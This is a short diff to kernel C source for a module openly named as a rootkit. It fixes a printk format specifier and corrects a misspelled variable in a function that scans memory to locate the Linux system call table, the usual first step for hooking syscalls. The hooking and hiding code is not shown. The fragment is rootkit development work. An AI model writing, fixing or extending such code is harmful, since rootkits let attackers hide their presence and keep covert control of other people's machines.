@@ -13,7 +13,7 @@ int rootkit_init(void) {
   retval = locate_sys_call_table();
   if (retval)
     return retval;
-  printk("We found the sys call table at %x", sys_call_table_addr);
+  printk("We found the sys call table at %p", sys_call_table_addr);
   return 0;
 }
 
@@ -43,11 +43,11 @@ int locate_sys_call_table(void) {
       sys_call_table_addr = &sctable[0];
       break;
     }
-    syscall_table_addr = 0;
+    sys_call_table_addr = 0;
   }
 #endif
   /* check for failure*/
-  if (syscall_table_addr == 0)
+  if (sys_call_table_addr == 0)
     return -EFAULT;
   return 0;
 }
